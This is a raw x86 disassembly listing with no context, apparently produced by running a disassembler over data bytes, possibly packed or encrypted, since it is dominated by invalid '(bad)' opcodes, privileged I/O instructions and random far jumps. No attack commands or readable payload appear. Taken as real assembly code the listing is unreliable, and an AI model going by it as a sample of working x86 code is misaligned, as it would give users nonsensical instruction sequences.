  418574:	sub    DWORD PTR [edi-0x8],edi
  418577:	cmp    DWORD PTR [eax-0x3b645eb],eax
  41857d:	pop    ecx
  41857e:	cld    
  41857f:	mov    esp,0x506d726d
  418584:	test   DWORD PTR [edx-0x18],0x5c2113dd
  41858b:	cdq    
  41858c:	inc    ecx
  41858d:	in     eax,dx
  41858e:	fldcw  WORD PTR [edi+0x64]
  418591:	stc    
  418592:	xor    ah,BYTE PTR [esi]
  418594:	adc    eax,0xd0989fcd
  418599:	mov    dl,0xc3
  41859b:	aam    0xd6
  41859d:	jl     0x418582
  41859f:	aad    0x98
  4185a1:	mov    ah,0x80
  4185a3:	ret    0x7ad2
  4185a6:	icebp  
  4185a7:	xchg   esi,eax
  4185a8:	fcmovnbe st,st(2)
  4185aa:	into   
  4185ab:	inc    esi
  4185ac:	dec    ebx
  4185ad:	enter  0x15d8,0xfd
  4185b1:	mov    ds:0x37d396d7,eax
  4185b6:	js     0x418609
  4185b8:	imul   ebx,ebx,0x4c
  4185bb:	aad    0xcd
  4185bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185be:	xchg   ebx,eax
  4185bf:	hlt    
  4185c0:	popf   
  4185c1:	out    0xc0,eax
  4185c3:	imul   edi,DWORD PTR [ebx],0xffffff9d
  4185c6:	mov    dh,BYTE PTR [eax+0x32]
  4185c9:	daa    
  4185ca:	and    DWORD PTR [edi-0x42818bd4],ebp
  4185d0:	icebp  
  4185d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185d2:	mov    esp,0x6dc3d53d
  4185d7:	frstor [ecx+0x79]
  4185da:	sub    eax,0x10fd3dec
  4185df:	lods   al,BYTE PTR ds:[esi]
  4185e0:	cmp    DWORD PTR [edi-0x5ee92170],edi
  4185e6:	lea    esi,gs:[ecx-0x1c]
  4185ea:	leave  
  4185eb:	retf   0x9d84
  4185ee:	(bad)  
  4185ef:	xchg   edx,eax
  4185f0:	mov    esp,0x468b341
  4185f5:	xchg   edx,eax
  4185f6:	xchg   esi,eax
  4185f7:	jp     0x41863e
  4185f9:	mov    bh,0xd6
  4185fb:	push   0x9
  4185fd:	cmp    BYTE PTR [edx-0x611c2264],dh
  418603:	(bad)  
  418604:	jbe    0x4185b7
  418606:	xlat   BYTE PTR ds:[ebx]
  418607:	popa   
  418608:	(bad)  
  418609:	neg    ebp
  41860b:	leave  
  41860c:	rol    DWORD PTR fs:[esi],cl
  41860f:	jmp    0x4185e3
  418611:	rcl    WORD PTR [esi+0x7084601b],0x6e
  418619:	inc    edi
  41861a:	cdq    
  41861b:	daa    
  41861c:	cli    
  41861d:	or     eax,0x8e626bdd
  418622:	mov    ch,0x95
  418624:	xchg   ebx,eax
  418625:	mov    ebp,0x2919b537
  41862a:	sub    edx,edx
  41862c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41862d:	pop    ss
  41862e:	fs mov ch,0x44
  418631:	fdiv   st(2),st
  418633:	ins    DWORD PTR es:[edi],dx
  418634:	iret   
  418635:	not    DWORD PTR [ebp-0x2a]
  418638:	or     al,0x73
  41863a:	xchg   edi,eax
  41863b:	icebp  
  41863c:	fnsave [ecx+0x7c]
  41863f:	arpl   di,cx
  418641:	or     eax,0x5cdf3791
  418646:	pop    eax
  418647:	sub    DWORD PTR [ebp+0x5a2a6bcf],eax
  41864d:	nop
  41864e:	add    DWORD PTR [edx-0x65],edx
  418651:	imul   ebp,DWORD PTR [ecx],0x7a79cfc9
  418657:	js     0x41869d
  418659:	push   es
  41865a:	test   al,0xf0
  41865c:	add    cl,bl
  41865e:	hlt    
  41865f:	retf   
  418660:	std    
  418661:	xchg   edx,eax
  418662:	loop   0x418689
  418664:	ins    DWORD PTR es:[edi],dx
  418665:	push   ebp
  418666:	sbb    al,BYTE PTR [ecx+0x15]
  418669:	into   
  41866a:	mov    dl,0x24
  41866c:	int3   
  41866d:	mov    DWORD PTR [eax-0x6],ecx
  418670:	pop    ds
  418671:	das    
  418672:	push   edx
  418673:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418674:	cmp    DWORD PTR [eax+0x32],edi
  418677:	xchg   edx,eax
  418678:	and    ebp,DWORD PTR [edx-0x50d2dd0c]
  41867e:	sub    bh,BYTE PTR [ecx]
  418680:	mov    ecx,0xb02fe0ea
  418685:	jmp    0xf1b3:0xdf8c5b5f
  41868c:	xchg   edi,eax
  41868d:	sbb    al,0x97
  41868f:	rol    DWORD PTR [eax],cl
  418691:	sbb    eax,0xdd7880d4
  418696:	fwait
  418697:	cli    
  418698:	fstp   st(1)
  41869a:	ret    0xc83c
  41869d:	push   edx
  41869e:	rcl    DWORD PTR [ecx+0x14cb5c6],cl
  4186a4:	aam    0xcb
  4186a6:	push   es
  4186a7:	(bad)  
  4186a8:	test   BYTE PTR ds:0xd970b851,0xca
  4186af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186b0:	pusha  
  4186b1:	test   eax,0x592423a1
  4186b6:	lock xor DWORD PTR [esp+ecx*8-0x20],esi
  4186bb:	stos   DWORD PTR es:[edi],eax
  4186bc:	lds    ecx,FWORD PTR [edi-0x30]
  4186bf:	into   
  4186c0:	lds    esp,FWORD PTR [ecx-0x31910f24]
  4186c6:	(bad)  
  4186c7:	adc    dl,BYTE PTR [edx-0x44eab18a]
  4186cd:	cwde   
  4186ce:	dec    ecx
  4186cf:	mov    bl,0x69
  4186d1:	add    ah,BYTE PTR [esi-0x35e1bdb6]
  4186d7:	bound  eax,QWORD PTR [esi]
  4186d9:	add    bl,BYTE PTR [edi]
  4186db:	bound  eax,QWORD PTR [ecx]
  4186dd:	xchg   ecx,eax
  4186de:	fs push esi
  4186e0:	sbb    dl,dh
  4186e2:	sbb    BYTE PTR [ecx+0x21],0x30
  4186e6:	push   ecx
  4186e7:	stc    
  4186e8:	in     eax,0x1e
  4186ea:	imul   esp,DWORD PTR [esi-0xb],0x57
  4186ee:	mov    ebx,0x37637e9
  4186f3:	push   cs
  4186f4:	les    edi,FWORD PTR [eax-0x49cf5b7c]
  4186fa:	fdivr  st(0),st
  4186fc:	cmp    esi,DWORD PTR [ebp+0x79]
  4186ff:	inc    edx
  418700:	data16 out dx,al
  418702:	in     al,0xd8
  418704:	aam    0xb1
  418706:	jl     0x41872a
  418708:	jb     0x4186fa
  41870a:	sub    al,BYTE PTR [esi-0x19]
  41870d:	push   es
  41870e:	das    
  41870f:	fst    st(6)
  418711:	push   ebp
  418712:	test   eax,0xed5e2848
  418717:	fnstsw WORD PTR [edx-0x13]
  41871a:	into   
  41871b:	xchg   ebp,eax
  41871c:	ins    DWORD PTR es:[edi],dx
  41871d:	push   es
  41871e:	inc    esp
  41871f:	mov    bh,0x74
  418721:	xchg   DWORD PTR ds:0x7576711a,ecx
  418727:	ror    BYTE PTR [ebp+esi*8+0x511a97b7],0x60
  41872f:	int3   
  418730:	jmp    0x27735bbb
  418735:	inc    esp
  418736:	inc    ebp
  418737:	out    dx,al
  418738:	add    dh,BYTE PTR [ebx+0x3f]
  41873b:	aad    0x75
  41873d:	popf   
  41873e:	call   0x9138:0x7c876a11
  418745:	mov    bl,0x3b
  418747:	mov    ebx,eax
  418749:	shl    BYTE PTR [ecx-0x3e],cl
  41874c:	pop    edx
  41874d:	test   al,0x64
  41874f:	in     al,0xd9
  418751:	mov    ds:0xefd020d4,eax
  418756:	xchg   esi,esi
  418758:	cld    
  418759:	mul    cl
  41875b:	aas    
  41875c:	inc    ebx
  41875d:	cwde   
  41875e:	paddb  mm7,QWORD PTR [esi+0x48fbbe20]
  418765:	mov    bl,0x71
  418767:	inc    eax
  418768:	lods   eax,DWORD PTR ds:[esi]
  418769:	jg     0x41876d
  41876b:	lods   eax,DWORD PTR ds:[esi]
  41876c:	cmp    bl,BYTE PTR [esi]
  41876e:	das    
  41876f:	clc    
  418770:	fldcw  WORD PTR [eax]
  418772:	add    ah,BYTE PTR [ecx+edi*1+0x10b9d15e]
  418779:	(bad)  
  41877a:	jae    0x4187cd
  41877c:	aam    0xf3
  41877e:	and    eax,0x9df2a5c0
  418783:	bound  esp,QWORD PTR [ebx-0x63]
  418786:	bound  edi,QWORD PTR ds:0x999472c6
  41878c:	rcl    BYTE PTR [ebp-0x793e120e],1
  418792:	jns    0x4187de
  418794:	jno    0x4187ce
  418796:	ret    
  418797:	sti    
  418798:	outs   dx,BYTE PTR ds:[esi]
  418799:	ins    BYTE PTR es:[edi],dx
  41879a:	mov    bh,0x2d
  41879c:	sbb    edx,DWORD PTR [ebx-0x3703f0fc]
  4187a2:	lahf   
  4187a3:	aad    0xe1
  4187a5:	stc    
  4187a6:	stos   DWORD PTR es:[edi],eax
  4187a7:	fdivrp st(6),st
  4187a9:	jge    0x418757
  4187ab:	and    DWORD PTR [edx+0x46cea4cc],eax
  4187b1:	in     eax,0xa9
  4187b3:	adc    ah,BYTE PTR [ecx+0x7c71b6b3]
  4187b9:	xchg   esi,eax
  4187ba:	aad    0x1
  4187bc:	or     dh,BYTE PTR [ebx-0x3604b2e8]
  4187c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187c3:	hlt    
  4187c4:	inc    esi
  4187c5:	adc    DWORD PTR [ebx+0x22],0x5c571519
  4187cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187cd:	data16 cmp al,0xf5
  4187d0:	adc    al,BYTE PTR [edi+edx*8-0x6b41a164]
  4187d7:	test   DWORD PTR [esi+0x4],esp
  4187da:	push   ds
  4187db:	aad    0xda
  4187dd:	(bad)  
  4187de:	repz and BYTE PTR [eax+0x30],ch
  4187e2:	fld    DWORD PTR [esi+0x4]
  4187e5:	inc    edi
  4187e6:	in     al,dx
  4187e7:	mov    eax,ds:0x204e8c2a
  4187ec:	loopne 0x4187a8
  4187ee:	les    ebx,FWORD PTR [eax+0x13]
  4187f1:	pop    ss
  4187f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187f3:	fwait
  4187f4:	outs   dx,DWORD PTR ds:[esi]
  4187f5:	pop    esi
  4187f6:	and    eax,0xd1cc4b59
  4187fb:	and    BYTE PTR fs:[esi+eax*4+0x14f4cda9],dl
  418803:	stc    
  418804:	and    eax,0xff1e5849
  41880a:	cs xchg esp,eax
  41880c:	in     al,dx
  41880d:	mov    esi,0xfeaf80e5
  418812:	in     eax,0xa7
  418814:	scas   eax,DWORD PTR es:[edi]
  418815:	mov    si,0xbada
  418819:	ins    BYTE PTR es:[edi],dx
  41881a:	mov    dh,0xd1
  41881c:	xchg   ebx,eax
  41881d:	inc    esp
  41881e:	test   eax,0x7937e97e
  418823:	sahf   
  418824:	sub    DWORD PTR [ebp+0x18],esi
  418827:	or     eax,0x3d2b3978
  41882c:	ins    DWORD PTR es:[edi],dx
  41882d:	fucomp st(0)
  41882f:	pop    ds
  418830:	and    BYTE PTR [ebx+0x45],dh
  418833:	mov    dh,0x21
  418835:	xchg   ebp,eax
  418836:	add    al,0x39
  418838:	outs   dx,BYTE PTR ds:[esi]
  418839:	pop    esi
  41883a:	mov    ds:0xe3dadc9f,al
  41883f:	dec    edi
  418840:	xor    DWORD PTR ds:[ebp+esi*2-0x1f],ecx
  418845:	mov    ds,WORD PTR [eax+0x6b04f6eb]
  41884b:	inc    esp
  41884c:	mov    al,ds:0x3eb226a6
  418851:	xchg   ebx,eax
  418852:	push   es
  418853:	pop    ebp
  418854:	(bad)  
  418855:	aad    0xf4
  418857:	cmp    bh,ah
  418859:	xchg   esi,eax
  41885a:	or     ah,BYTE PTR [ebx+esi*1-0x49]
  41885e:	add    BYTE PTR [ebp+0x23c741a7],al
  418864:	inc    eax
  418865:	mov    DWORD PTR ds:0xebbffb1b,0x1f57f20c
  41886f:	pop    es
  418870:	ins    DWORD PTR es:[edi],dx
  418871:	mov    edx,0x7e609dc7
  418876:	mov    dh,0xbe
  418878:	adc    ecx,DWORD PTR [ebp-0x1fe71857]
  41887e:	popa   
  41887f:	data16 scas al,BYTE PTR es:[edi]
  418881:	add    al,0x1
  418883:	daa    
  418884:	iret   
  418885:	iret   
  418886:	lea    esp,[edi+eax*1+0x38acff5f]
  41888d:	repnz cmp eax,0x156e723c
  418893:	jno    0x4188b5
  418895:	dec    ecx
  418896:	call   DWORD PTR [edi+0x2da35d5b]
  41889c:	or     ah,BYTE PTR [ecx]
  41889e:	popf   
  41889f:	pminsw mm2,mm0
  4188a2:	dec    esi
  4188a3:	dec    ecx
  4188a4:	stc    
  4188a5:	inc    edx
  4188a6:	out    0x97,al
  4188a8:	fistp  DWORD PTR [ecx-0x28]
  4188ab:	cli    
  4188ac:	mov    ecx,0xeb6a9ba2
  4188b1:	mov    bh,0xa6
  4188b3:	pushf  
  4188b4:	fstp   QWORD PTR [ebp+0x7c9b2b91]
  4188ba:	push   cs
  4188bb:	jno    0x4188b2
  4188bd:	mov    bh,0x78
  4188bf:	mov    bl,0x32
  4188c1:	mov    ah,0xda
  4188c3:	je     0x4188e3
  4188c5:	ss es loopne 0x418863
  4188c9:	mov    ebx,0x48eff88c
  4188ce:	add    ah,0x10
  4188d1:	inc    eax
  4188d2:	mov    esp,DWORD PTR [edx]
  4188d4:	push   ds
  4188d5:	or     ebx,DWORD PTR [esi-0x9]
  4188d8:	push   edx
  4188d9:	mov    esi,0xd987f529
  4188de:	outs   dx,DWORD PTR ds:[esi]
  4188df:	xor    eax,0x69d61caf
  4188e4:	aad    0x6c
  4188e6:	(bad)  
  4188e7:	xor    dh,bl
  4188e9:	in     eax,dx
  4188ea:	mov    al,0x42
  4188ec:	dec    ebp
  4188ed:	adc    al,0x5
  4188ef:	cmp    edi,ecx
  4188f1:	shl    BYTE PTR [ebx-0x4e],0xee
  4188f5:	or     bh,al
  4188f7:	nop
  4188f8:	call   0x7f75:0x9b9c658c
  4188ff:	xor    dl,BYTE PTR [esi-0x31]
  418902:	in     eax,0xa3
  418904:	xchg   esp,eax
  418905:	xor    BYTE PTR [ebx-0x5a4db95e],0x92
  41890c:	out    dx,al
  41890d:	fisub  DWORD PTR [edx+0x416fe9e0]
  418913:	mov    cl,0x5b
  418915:	sti    
  418916:	test   DWORD PTR [esi-0xd96351e],esi
  41891c:	dec    edx
  41891d:	sub    esp,edx
  41891f:	sub    al,0x7b
  418921:	mov    BYTE PTR [eax],bh
  418923:	(bad)  
  418924:	fiadd  WORD PTR [esp-0x461110da]
  41892b:	adc    BYTE PTR [eax-0x61],bl
  41892e:	push   ebp
  41892f:	cwde   
  418930:	push   esi
  418931:	adc    DWORD PTR [eax-0xb],ebx
  418934:	scas   eax,DWORD PTR es:[edi]
  418935:	mov    eax,ds:0xaf6b8bb0
  41893a:	sbb    DWORD PTR [ecx+0x1daccd00],ebx
  418940:	jnp    0x4188e3
  418942:	mov    gs:0x97156fe8,eax
  418948:	xchg   esi,eax
  418949:	mul    BYTE PTR [ebx-0x2866a0d0]
  41894f:	mov    bl,0xa3
  418951:	sbb    BYTE PTR [ecx+0x50],ah
  418954:	pop    ebx
  418955:	in     al,0x61
  418957:	outs   dx,BYTE PTR ds:[esi]
  418958:	sbb    DWORD PTR [edi+0x2c],ecx
  41895b:	xchg   di,ax
  41895d:	add    BYTE PTR [edx+0x555f8ed1],bl
  418963:	lea    edx,[esi+0x4700fb52]
  418969:	xlat   BYTE PTR ds:[ebx]
  41896a:	mov    ah,0x21
  41896c:	sahf   
  41896d:	or     eax,0x5a9f3362
  418972:	sub    eax,ecx
  418974:	mov    eax,ds:0x5cbbed63
  418979:	test   DWORD PTR [bx-0x1f],0x34742827
  418981:	and    esp,DWORD PTR [edx+0x498b6703]
  418987:	aam    0xde
  418989:	imul   ebp,DWORD PTR ds:0xe9442874,0xcaeca95f
  418993:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418994:	shl    BYTE PTR [eax-0xb],cl
  418997:	jbe    0x418923
  418999:	pushf  
  41899a:	add    al,0x15
  41899c:	fsubr  DWORD PTR [eax]
  41899e:	nop
  41899f:	fbld   TBYTE PTR [esi]
  4189a1:	sub    DWORD PTR [edx],0xffffffdf
  4189a4:	fnstsw WORD PTR [ecx+0x2f]
  4189a7:	cmp    eax,eax
  4189a9:	xchg   edx,eax
  4189aa:	jmp    0x2103:0xf4c85a7e
  4189b1:	xor    ebp,DWORD PTR [ebp+ecx*2+0x2f]
  4189b5:	xchg   ebx,eax
  4189b6:	xchg   edi,eax
  4189b7:	cmp    eax,0xb87cb68a
  4189bc:	sbb    eax,0x478606fd
  4189c1:	jp     0x418a24
  4189c3:	adc    cl,ah
  4189c5:	mov    ecx,0x930fad27
  4189ca:	pop    ds
  4189cb:	test   DWORD PTR [ecx-0x63],edi
  4189ce:	push   0xaa650087
  4189d3:	lods   al,BYTE PTR es:[esi]
  4189d5:	call   0x64d5:0xdd2c405d
  4189dc:	test   esi,0x2ec29379
  4189e2:	clc    
  4189e3:	dec    ecx
  4189e4:	mov    edx,0x34ee4eee
  4189e9:	jmp    0x361f:0xc645d31
  4189f0:	jno    0x41899a
  4189f2:	mov    ecx,0xddf4b837
  4189f7:	and    dl,ah
  4189f9:	dec    edi
  4189fa:	adc    BYTE PTR [edx],0x64
  4189fd:	es jp  0x4189f1
  418a00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a01:	icebp  
  418a02:	pop    ecx
  418a03:	xor    eax,0x2734d5eb
  418a08:	aad    0xb0
  418a0a:	cmp    ch,bl
  418a0c:	and    al,0x2d
  418a0e:	and    BYTE PTR [edi],0x94
  418a11:	ds mov ebp,0xe5278bf0
  418a17:	cmp    ebp,ecx
  418a19:	jnp    0x418a23
  418a1b:	std    
  418a1c:	rcl    BYTE PTR [ecx+edi*4],cl
  418a1f:	ss daa 
  418a21:	adc    eax,0x2a58c6fd
  418a26:	ins    DWORD PTR es:[edi],dx
  418a27:	mov    eax,ds:0x31d9d8d1
  418a2c:	fistp  DWORD PTR [ebp-0x1deae8ff]
  418a32:	in     eax,dx
  418a33:	push   es
  418a34:	rcl    DWORD PTR [eax+0x4d],0xdc
  418a38:	test   eax,0x945a360
  418a3d:	mov    eax,0xb3791e71
  418a42:	ins    DWORD PTR es:[edi],dx
  418a43:	dec    ebx
  418a44:	xchg   ah,dh
  418a46:	or     al,0xe9
  418a48:	adc    edi,esi
  418a4a:	xchg   ecx,eax
  418a4b:	dec    BYTE PTR [eax+0x7b]
  418a4e:	pop    esi
  418a4f:	cmp    al,0x1f
  418a51:	in     eax,dx
  418a52:	sub    BYTE PTR [ecx+eiz*4-0x28534eac],bl
  418a59:	pop    ebp
  418a5a:	data16 shl BYTE PTR [esi],1
  418a5d:	mov    al,0xb3
  418a5f:	xchg   edi,eax
  418a60:	call   0xbd52:0x56719a8c
  418a67:	dec    ebp
  418a68:	inc    edi
  418a69:	pop    esp
  418a6a:	xchg   ebx,eax
  418a6b:	in     eax,0x3
  418a6d:	add    DWORD PTR [edi+0x19907e63],edi
  418a73:	push   ss
  418a74:	mov    dh,cl
  418a76:	(bad)  
  418a77:	push   esp
  418a78:	cmc    
  418a79:	and    ebx,ecx
  418a7b:	ins    DWORD PTR es:[edi],dx
  418a7c:	mov    dl,0x1f
  418a7e:	sbb    eax,ebx
  418a80:	adc    DWORD PTR [edi-0x34],ebx
  418a83:	leave  
  418a84:	mov    ebx,0x2bcf9858
  418a89:	mov    eax,ds:0x120fc5f3
  418a8e:	cmp    esi,DWORD PTR [ebx+0x24]
  418a91:	addr16 cmc 
  418a93:	pop    eax
  418a94:	arpl   WORD PTR [edx],cx
  418a96:	mov    esp,0x6a6e06e8
  418a9b:	cwde   
  418a9c:	xchg   ebx,eax
  418a9d:	xchg   DWORD PTR [esi-0x34eb51ac],ebx
  418aa3:	lock mov al,ds:0x4cef4c69
  418aa9:	retf   
  418aaa:	mov    ebx,0x7f4b7454
  418aaf:	in     al,dx
  418ab0:	push   ds
  418ab1:	inc    edx
  418ab2:	jns    0x418a97
  418ab4:	sar    DWORD PTR ds:0x412afe67,1
  418aba:	adc    eax,0xb6106ec
  418abf:	mov    dl,0x1a
  418ac1:	push   0xc2cb055b
  418ac6:	cwde   
  418ac7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ac8:	mov    esp,0xe45481b8
  418acd:	arpl   WORD PTR [ebp-0x2ea2414b],bp
  418ad3:	ds leave 
  418ad5:	xor    eax,0x9c1fee8b
  418ada:	mov    ds:0x5534a8f0,al
  418adf:	cmc    
  418ae0:	dec    ebp
  418ae1:	mov    WORD PTR [edi+0x9],gs
  418ae4:	ret    
  418ae5:	lods   al,BYTE PTR ds:[esi]
  418ae6:	bound  edx,QWORD PTR [edx]
  418ae8:	sub    edi,ecx
  418aea:	test   eax,0x9d08f92d
  418aef:	ins    DWORD PTR es:[edi],dx
  418af0:	popa   
  418af1:	sbb    edx,DWORD PTR [ebp-0x5140a9cb]
  418af7:	aaa    
  418af8:	pop    esi
  418af9:	fidivr DWORD PTR [ebx]
  418afb:	jg     0x418b16
  418afd:	sbb    dl,bh
  418aff:	shl    BYTE PTR [ebx+0xf],0x3b
  418b03:	pop    esi
  418b04:	fwait
  418b05:	xor    DWORD PTR [eax+0x79632fb7],esp
  418b0b:	fnstenv [edi+0x28823920]
  418b11:	aaa    
  418b12:	and    eax,DWORD PTR [ebp+0x36]
  418b15:	(bad)  
  418b16:	jne    0x418ac3
  418b18:	mov    ?,WORD PTR [ebx+0x7cb0e934]
  418b1e:	dec    esi
  418b1f:	rcr    DWORD PTR [esi],0x89
  418b22:	ins    DWORD PTR es:[edi],dx
  418b23:	dec    ecx
  418b24:	fstp   QWORD PTR [esi+0x70d959b3]
  418b2a:	mov    fs,WORD PTR [ebx+edi*1]
  418b2d:	test   DWORD PTR [edx-0x41],edi
  418b30:	xchg   edx,eax
  418b31:	es and al,0x18
  418b34:	loope  0x418aef
  418b36:	pop    esp
  418b37:	pushf  
  418b38:	aad    0xb3
  418b3a:	jecxz  0x418ba3
  418b3c:	sub    DWORD PTR [ecx-0x4620d764],edi
  418b42:	or     DWORD PTR [ecx],edi
  418b44:	scas   eax,DWORD PTR es:[edi]
  418b45:	aas    
  418b46:	in     al,dx
  418b47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b48:	xchg   DWORD PTR [eax+0x4f],edi
  418b4b:	mov    esi,0x1f041db4
  418b50:	dec    esp
  418b51:	and    al,0x1e
  418b53:	bound  esp,QWORD PTR [esi+eiz*1]
  418b56:	cli    
  418b57:	mov    esi,DWORD PTR [ebp+0x1d]
  418b5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b5b:	fst    DWORD PTR [ebx+0x5ab98f87]
  418b61:	int    0x52
  418b63:	cmp    eax,0x170d2ee9
  418b68:	out    0x9f,eax
  418b6a:	cmc    
  418b6b:	clc    
  418b6c:	dec    edi
  418b6d:	mov    bl,0x9d
  418b6f:	in     al,dx
  418b70:	jae    0x418b2c
  418b72:	xchg   edi,eax
  418b73:	test   cl,ah
  418b75:	lods   eax,DWORD PTR ds:[esi]
  418b76:	fs xchg esi,eax
  418b78:	cli    
  418b79:	add    DWORD PTR [ebx+0x64],0x7e
  418b7d:	loopne 0x418bb3
  418b7f:	mov    edi,0xabb0f97b
  418b84:	add    BYTE PTR [ecx+ecx*8],0x73
  418b88:	call   0xceb7:0x19b3ed1a
  418b8f:	js     0x418b83
  418b91:	imul   ecx,DWORD PTR [edi],0x75
  418b94:	dec    edx
  418b95:	fild   DWORD PTR [ebx-0x640f08fa]
  418b9b:	jno    0x418c16
  418b9d:	xor    BYTE PTR [ecx-0x8af3153],0x36
  418ba4:	leave  
  418ba5:	ss sub eax,0x49e19ec1
  418bab:	push   es
  418bac:	enter  0x4520,0x6b
  418bb0:	imul   esi,DWORD PTR [edx],0x29
  418bb3:	inc    eax
  418bb4:	xor    DWORD PTR [ecx+0x70],0x4f
  418bb8:	and    bh,BYTE PTR ds:0xae8ed89b
  418bbe:	inc    edi
  418bbf:	stos   DWORD PTR es:[edi],eax
  418bc0:	das    
  418bc1:	pop    ds
  418bc2:	addr16 lahf 
  418bc4:	fst    QWORD PTR [edi+esi*8+0x69f5e34f]
  418bcb:	es inc edx
  418bcd:	jae    0x418bd3
  418bcf:	xor    DWORD PTR [ebp-0x4c],0xffffffdb
  418bd3:	retf   
  418bd4:	sub    al,0x4d
  418bd6:	xor    eax,0x65876bac
  418bdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418bdc:	pusha  
  418bdd:	dec    eax
  418bde:	repz pop edx
  418be0:	adc    edx,ecx
  418be2:	add    cl,BYTE PTR [edx]
  418be4:	jmp    0xa934:0xea6d
  418bea:	pop    ecx
  418beb:	rcr    DWORD PTR [ebx-0x72],cl
  418bee:	and    dl,BYTE PTR [edi]
  418bf0:	dec    ecx
  418bf1:	mov    bl,0xb9
  418bf3:	mov    eax,0x9cb6272e
  418bf8:	adc    al,0xfd
  418bfa:	jo     0x418b91
  418bfc:	rol    BYTE PTR [edx+0x53f076ee],1
  418c02:	jmp    0x3f14:0x26bbde34
  418c09:	test   al,0x1
  418c0b:	int    0x37
  418c0d:	mov    al,0x9
  418c0f:	aas    
  418c10:	pusha  
  418c11:	ja     0x418c5f
  418c13:	aaa    
  418c14:	aaa    
  418c15:	jecxz  0x418b9d
  418c17:	or     edx,DWORD PTR [edx-0x2408256f]
  418c1d:	mov    cl,0x4c
  418c1f:	cmp    DWORD PTR [ebp+eax*1+0x6f],ebp
  418c23:	or     ah,cl
  418c25:	psrlq  mm3,QWORD PTR [esi+eiz*1-0x3e1713f0]
  418c2d:	mov    ecx,0x4a08ac77
  418c32:	jge    0x418c99
  418c34:	push   0x90e15f72
  418c39:	and    eax,0x560745f7
  418c3e:	repz sub BYTE PTR [ecx+0x3b],0x2
  418c43:	fucomip st,st(2)
  418c45:	push   ebp
  418c46:	aad    0x2c
  418c48:	dec    ecx
  418c49:	cld    
  418c4a:	dec    esi
  418c4c:	retf   0x900a
  418c4f:	sbb    eax,DWORD PTR [eax]
  418c51:	pop    DWORD PTR [ebx]
  418c53:	inc    edi
  418c54:	mov    gs,ebp
  418c56:	xchg   ebx,eax
  418c57:	retf   
  418c58:	mov    cl,0xa
  418c5a:	mov    bh,0xfe
  418c5c:	(bad)  
  418c5d:	cdq    
  418c5e:	in     eax,dx
  418c5f:	mov    dl,0x4f
  418c61:	shl    DWORD PTR [esi],1
  418c63:	and    eax,0x7d5e5d55
  418c68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c69:	jmp    0x3618032f
  418c6e:	and    al,0x13
  418c70:	pop    esi
  418c71:	pusha  
  418c72:	gs xchg ecx,eax
  418c74:	into   
  418c75:	mov    ?,WORD PTR [ecx-0x71678d58]
  418c7b:	call   0x9533c556
  418c80:	mov    ds:0x220b88a5,eax
  418c85:	push   ss
  418c86:	mov    BYTE PTR [ecx+eax*1+0x48350954],ch
  418c8d:	ins    BYTE PTR es:[edi],dx
  418c8e:	call   0xd2b8:0x9636c457
  418c95:	mov    ch,0x9f
  418c97:	mov    esp,esp
  418c99:	xchg   ebx,eax
  418c9a:	sub    ebx,DWORD PTR [eax-0x3aa8ecee]
  418ca0:	dec    ebx
  418ca1:	inc    ebx
  418ca2:	neg    DWORD PTR [edi+0x35]
  418ca5:	addr16 and edi,ecx
  418ca8:	jb     0x418d21
  418caa:	stc    
  418cab:	and    eax,0xf37ef4ad
  418cb0:	lock lods al,BYTE PTR ds:[esi]
  418cb2:	sub    esi,ecx
  418cb4:	pop    ecx
  418cb5:	pop    es
  418cb6:	mov    esp,0xf1510a82
  418cbb:	stos   BYTE PTR es:[edi],al
  418cbc:	mov    ds:0x112a337e,eax
  418cc1:	mov    esp,0x2de859f4
  418cc6:	and    DWORD PTR [ebx],edi
  418cc8:	cmp    dh,ch
  418cca:	out    0xb1,eax
  418ccc:	dec    esi
  418ccd:	pop    ebx
  418cce:	pop    ecx
  418ccf:	sub    BYTE PTR [edi-0x3440f216],bl
  418cd5:	fnsave [edi]
  418cd7:	cmp    edi,DWORD PTR [edi]
  418cd9:	or     al,0x42
  418cdb:	push   ds
  418cdc:	xlat   BYTE PTR ds:[ebx]
  418cdd:	jmp    0x28f3d0f1
  418ce2:	pop    eax
  418ce3:	in     eax,dx
  418ce4:	cwde   
  418ce5:	imul   eax,DWORD PTR [edx-0x362065b4],0xffffffd2
  418cec:	sub    eax,DWORD PTR [ecx-0x7c]
  418cef:	mov    ch,0x4d
  418cf1:	aas    
  418cf2:	mov    dl,0x54
  418cf4:	imul   ebp,DWORD PTR [ebx+0x47],0x3a
  418cf8:	and    eax,0xb1d118a
  418cfd:	mov    bl,dl
  418cff:	jns    0x418c86
  418d01:	cs mov edi,0x8a4d0ef6
  418d07:	pop    ebx
  418d08:	xor    eax,0x7239050d
  418d0d:	scas   al,BYTE PTR es:[edi]
  418d0e:	rcr    DWORD PTR [edx+0x61],cl
  418d11:	retf   
  418d12:	(bad)  
  418d13:	loope  0x418cc7
  418d15:	test   al,0xd8
  418d17:	pop    es
  418d18:	pop    edx
  418d19:	adc    BYTE PTR [ecx],ch
  418d1b:	data16 fld TBYTE PTR [esi]
  418d1e:	not    DWORD PTR [ecx+0x5bebaa7b]
  418d24:	enter  0x7338,0x3c
  418d28:	jne    0x418cb4
  418d2a:	imul   ebx,DWORD PTR [edi],0xffffff92
  418d2d:	sub    DWORD PTR [ebx-0x11cfed9],edi
  418d33:	xlat   BYTE PTR ds:[ebx]
  418d34:	sbb    DWORD PTR [edx-0x2322cb89],esi
  418d3a:	ret    0xb4a4
  418d3d:	sbb    ebp,DWORD PTR [edx+0x1bb63b72]
  418d43:	sbb    eax,0xe3cd0919
  418d48:	sar    bl,cl
  418d4a:	addr16 jne 0x418d9d
